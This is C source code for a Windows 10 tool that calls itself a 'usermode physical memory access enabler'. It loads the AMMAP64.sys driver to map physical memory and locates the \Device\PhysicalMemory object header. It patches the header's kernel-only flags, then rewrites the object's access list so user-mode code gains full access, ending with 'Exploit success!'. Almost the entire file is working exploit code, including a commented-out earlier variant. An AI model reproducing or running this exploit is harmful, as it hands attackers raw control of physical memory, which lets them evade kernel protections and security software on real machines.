#include "EnablePhysicalMemory.h"
#include "AMMAP64.h"

static BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, PDWORD64 Address, PSIZE_T Length, PDWORD64 VirtualAddress)
{
	NTSTATUS			ntStatus;
	PHYSICAL_ADDRESS	viewBase;

	*VirtualAddress = 0;
	viewBase.QuadPart = (ULONGLONG) (*Address);
	ntStatus = ZwMapViewOfSection
		(
			PhysicalMemory,
			GetCurrentProcess(),
			(PVOID *) VirtualAddress,
			0L,
			*Length,
			&viewBase,
			Length,
			ViewShare,
			0,
			PAGE_READWRITE
		);

	if(!NT_SUCCESS(ntStatus)) return false;
	*Address = viewBase.LowPart;
	return true;
}

static BOOLEAN UnMapmemory(PDWORD64 Address)
{
	if(!ZwUnmapViewOfSection(GetCurrentProcess(), (PVOID) Address))
		return true;
	else
		return false;
}

static BOOLEAN ChangeSecurityDescriptorPhysicalMemory()
{
	EXPLICIT_ACCESS		Access;
	PACL				OldDacl = NULL, NewDacl = NULL;
	SECURITY_DESCRIPTOR security;
	ZeroMemory(&security, sizeof(SECURITY_DESCRIPTOR));

	PSECURITY_DESCRIPTOR	psecurity = &security;
	NTSTATUS				status;
	HANDLE					physmem;
	UNICODE_STRING			physmemString;
	OBJECT_ATTRIBUTES		attributes;
	WCHAR					physmemName[] = L"\\device\\physicalmemory";

	RtlInitUnicodeString(&physmemString, physmemName);

	InitializeObjectAttributes(&attributes, &physmemString, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = ZwOpenSection(&physmem, WRITE_DAC | READ_CONTROL, &attributes);

	if(!NT_SUCCESS(status)) return false;

	GetSecurityInfo(physmem, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &OldDacl, NULL, 0);

	Access.grfAccessPermissions = SECTION_ALL_ACCESS;
	Access.grfAccessMode = GRANT_ACCESS;
	Access.grfInheritance = NO_INHERITANCE;
	Access.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
	Access.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
	Access.Trustee.TrusteeType = TRUSTEE_IS_USER;
	Access.Trustee.ptstrName = L"CURRENT_USER";

	SetEntriesInAcl(1, &Access, OldDacl, &NewDacl);

	SetSecurityInfo(physmem, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, NewDacl, NULL);

	CloseHandle(physmem);
	return true;
};


static HANDLE OpenPhysicalMemory()
{
	UNICODE_STRING		physmemString;
	OBJECT_ATTRIBUTES	attributes;
	WCHAR				physmemName[] = L"\\device\\physicalmemory";
	NTSTATUS			status;
	HANDLE				physmem;

	RtlInitUnicodeString(&physmemString, physmemName);

	InitializeObjectAttributes(&attributes, &physmemString, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = ZwOpenSection(&physmem, SECTION_ALL_ACCESS, &attributes);

	if(!NT_SUCCESS(status))
	{
		printf("%08x\n", status);
		return NULL;
	}

	return physmem;
}

int isAscii(int c)
{
	return(c > 'A' && c < 'z');
}

int isPrintable(uint32_t uint32)
{
	if((isAscii((uint32 >> 24) & 0xFF)) && (isAscii((uint32 >> 16) & 0xFF)) && (isAscii((uint32 >> 8) & 0xFF)) &&
	   (isAscii((uint32) & 0xFF)))
		return true;
	else
		return false;
}

int main()
{
	printf("Usermode physical memory access enabler\n");
	printf("Tested only on Win10 x64, might BSOD your machine.\n");
	printf("If you're sure you want to continue, press any key otherwise close this window.\n");

	getchar();

	auto hDriver = OpenDriver();
	if (!hDriver || hDriver == (HANDLE)-1) {
		printf("Driver AMMAP64.sys is not running, launch the bat file...\n");
		return 0;
	}

	
	IoCommand myIo = { 0 };
	myIo.offset = 0x0;
	myIo.read.QuadPart = 0x1000;
	
	bool bFound = false;

	if (DriverMapMemory(hDriver, &myIo)) {

		char *cursor = (char*)myIo.virtualmemory;

		while (myIo.offset <= 0x0FFFFFFF) {
			auto pPoolHeader = (PPOOL_HEADER)cursor;
			auto skipsize = (pPoolHeader->BlockSize << 4);
			if ((pPoolHeader->PoolTag & 0x7FFFFFFF) != 0x74636553) // Prior to Windows 8 the kernel marked “protected” allocations by setting the most significant bit of PoolTag, so care should be taken to scan for both variants
			{	
				if (skipsize == 0 || !isPrintable(pPoolHeader->PoolTag & 0x7FFFFFFF)) skipsize = 0x1000;
				cursor += skipsize;
			}
			else
			{
				auto pObjectHeader = (POBJECT_HEADER)(cursor + 0x30);
				if (pObjectHeader->HandleCount >= 0 && pObjectHeader->HandleCount <= 3 && pObjectHeader->KernelObject == 1 && pObjectHeader->KernelOnlyAccess == 1)
				{
					printf("Found PhysicalMemory Object Header at %p\n", cursor += 0x30);
					pObjectHeader->KernelObject = 0;
					pObjectHeader->KernelOnlyAccess = 0;
					bFound = true;
					if (!DriverUnmapMemory(hDriver, &myIo)) {
						printf("Failed to unmap memory?\n");
						break;
					}
					break;
				}

				//printf("Found sect at : %I64x\n", dwOffset + (cursor - myMemory));
				cursor += skipsize;
			}

			if ((ULONGLONG)(cursor - myIo.virtualmemory) >= myIo.read.QuadPart)
			{
				if (!DriverUnmapMemory(hDriver, &myIo)) {
					printf("Failed to unmap memory?\n");
					break;
				}
				myIo.offset += 0x1000;

				DriverMapMemory(hDriver, &myIo);
				cursor = (char*)myIo.virtualmemory;
			}
		}
	}
	if (!bFound)
		printf("Read %d bytes without finding the physical address, did you already patch? Testing access... (requires administrator or it will fail.)\n", myIo.offset);
	CloseDriver(hDriver);
	if (!ChangeSecurityDescriptorPhysicalMemory()) {
		printf("Failed to open hande on \\Device\\PhysicalMemory from usermode, either you don't have Administrator privilege or the exploit failed.\n");
		return 0;
	}
	auto hMemory = OpenPhysicalMemory();
	if (hMemory && hMemory != (HANDLE)-1) {
		CloseHandle(hMemory);
		printf("Exploit success!\n");
		printf("You can now map \Device\PhysicalMemory from usermode\n");
		system("pause");
		return 0;
	}
	
	printf("Exploit failed...\n");
	system("pause");

	
	/*
	if(MapPhysicalMemory(hMemory, &dwOffset, &dwRead, (PDWORD64) & myMemory))
	{
		char	*cursor = myMemory;
		while(dwOffset <= 0x0FFFFFFF)
		{
			PPOOL_HEADER	x = (PPOOL_HEADER) cursor;
			if(x->PoolTag != 0x74636553)
			{	//Not a Sect pooltag
				int skipsize = (x->BlockSize << 4);
				if(skipsize == 0 || !isPrintable(x->PoolTag)) skipsize = 0x1000;

				cursor += skipsize;
			}
			else
			{
				int				skipsize = (x->BlockSize << 4);

				POBJECT_HEADER	objectHeader = (POBJECT_HEADER) (cursor + 0x30);
				if(objectHeader->HandleCount >= 1 && objectHeader->HandleCount <= 3 && objectHeader->KernelObject == 1)
				{
					printf("Found PhysicalMemory Object Header at %p\n", cursor += 0x30);
					objectHeader->KernelObject = 0;
					objectHeader->KernelOnlyAccess = 0;
				}

				//printf("Found sect at : %I64x\n", dwOffset + (cursor - myMemory));
				cursor += skipsize;
			}

			if((SIZE_T)(cursor - myMemory) >= dwRead)
			{
				if (!UnMapmemory((PDWORD64)myMemory)) {
					printf("Failed to unmap memory?\n");
					break;
				}
				dwOffset += 0x1000;

				MapPhysicalMemory(hMemory, &dwOffset, &dwRead, (PDWORD64) & myMemory);
				cursor = myMemory;
			}

			//break;
		}
	}
	*/

	
	

	return 0;
}
